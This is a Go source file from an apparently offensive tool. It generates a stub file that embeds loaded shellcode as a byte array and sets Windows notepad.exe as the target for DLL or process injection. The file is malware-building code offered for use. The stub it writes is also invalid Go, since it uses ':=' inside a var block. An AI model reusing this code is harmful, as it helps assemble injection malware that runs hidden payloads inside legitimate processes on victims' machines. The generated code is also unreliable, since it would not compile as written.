package main

import (
	"fmt"
	"friis/config"
	"os"
)

func GenerateStub() {
	fmt.Println("Generating stub code for DLL injection...")

	shellcode := config.LoadShellcode("pathfinder")

	// Open or create stub.go file.
	file, err := os.Create("config/stub.go")
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// Write code to the generated file.
	file.WriteString("// Code generated by generate.go; DO NOT EDIT.\n")
	file.WriteString("package config\n")
	file.WriteString("var (\n")
	file.WriteString("\tTarget := \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"\n")
	file.WriteString("\tShellcode := []byte{")

	// Convert the shellcode bytes to Go byte slice format
	for i, b := range shellcode {
		if i > 0 {
			file.WriteString(", ")
		}
		file.WriteString(fmt.Sprintf("0x%02X", b))
	}

	// End the byte slice and close the Go code.
	file.WriteString("}\n")
	file.WriteString(")\n")

	fmt.Println("Stub code generated successfully in 'config/stub.go'")
}
